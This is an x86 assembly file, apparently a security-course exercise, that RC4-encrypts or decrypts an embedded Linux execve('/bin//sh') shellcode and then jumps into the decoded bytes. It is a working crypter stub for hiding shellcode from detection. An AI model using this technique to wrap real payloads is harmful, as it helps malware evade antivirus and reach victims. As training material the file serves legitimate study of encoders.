; SLAE-xxx
; assignment 7: use an encryption scheme to encode shellcode  
; originality: RC4 assembly , this is taken from a RC4 benchmark in x86 and adapted to encode / decode shellcode 
; source: https://github.com/chen-yumin/rc4-cipher-in-assembly/blob/master/rc4_cipher.c

; lets RC4 ! 


global _start

_start: 

; the decoder stub wont be small with this kind of encryption 
; i mean its much more heavy than say shikata ga nai XOR encoder 
; you need to create and populate a 256 bytes struct here so if you 
; want to embed a decoder stub, its gonna be bigger 


; first fill the structure [256] with 0..255  
mov eax,s256 
mov ecx,256 
fill_s: 
	xor ebx,ebx
	sub bl,cl ; 
	mov [eax + ebx], bl; move along the array and put values into it  
loop fill_s 
; you can check the result in gdb  
; gdb$ x/100x &s256 
; 0x80490ec <s256>:	0x03020100	0x00000004


; KSA 
; permute the struct based on the selected key 
ksa: 
mov edx,key 
mov edi,keylen ; edi = size of key 
mov esi,keyptr ; esi = k 
mov ecx,256 
xor ebx,ebx ; ebx = j 

loop_j:
	cmp ebx,edi ; test if below  
	jl continue_loop
	xor ebx, ebx ; clear ebx, move to start of key , repeat until done all 

continue_loop: 
	mov ah, [edx + ebx] ; take key content and put it in struct 
	mov [esi], ah ; move the byte to key struct  
	inc esi  
	inc ebx 
	loop loop_j 


; Generate S 
; you can check that the struct created is similar to the python script
; to verify you are doing good  
mov edi,s256
xor ebx,ebx 
sub esi,256 
xor eax,eax 
mov ecx,256 

loop_s: 
	mov dl, [esi+eax]
	add bl, dl
	mov dl, [edi+eax]
	add bl, dl
	mov dl, [edi+eax]
	mov dh, [edi+ebx]
	mov [edi+eax], dh
	mov [edi+ebx], dl
	inc eax
	loop loop_s	


; now lets encode using the pseudo ramdom stream 
encode: 
mov esi, shellcode 
mov edi, s256
mov edx, output 

; clean registers 
xor eax, eax 
xor ebx,ebx

; do this for size of the shellcode 
mov ecx,shelllen 

cd: 
	push ecx
	movzx ecx,al
	inc cl
	push edx
	mov dh,[edi+ecx]
	add bl,dh
	mov dl,[edi+ebx]
	mov [edi+ecx],dl
	mov [edi+ebx],dh
	add dl,dh
	movzx edx,dl
	mov dl,[edi+edx]
	mov cl,[esi+eax]
	xor cl,dl
	pop edx
	mov [edx+eax],cl
	inc eax
	pop ecx
	loop cd


; since the same function in RC4 is  used to encode and decode
; we will output the modified shellcode but also jump to it after 

; output the encoded / decoded stuff
print_encoded: 
; print the encoded shellcode, to see bytes use | xxd for instance 
mov eax, 0x4
mov ebx, 0x1
mov ecx, output
mov edx, shelllen
int 0x80


; now jump to decoded shellcode 
end: 
; in case of encoding we will segfault , otherwise we jump to decoded shellcode 
jmp output 



section .data 

key: db "supersecret!"
keylen equ $-key 

shellcode: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
shelllen equ $-shellcode 

	
section .bss 

keyptr: resb 256
s256: resb 256 
; output size of 1024 bytes should be enough for shellcodes 
output: resb 1024 


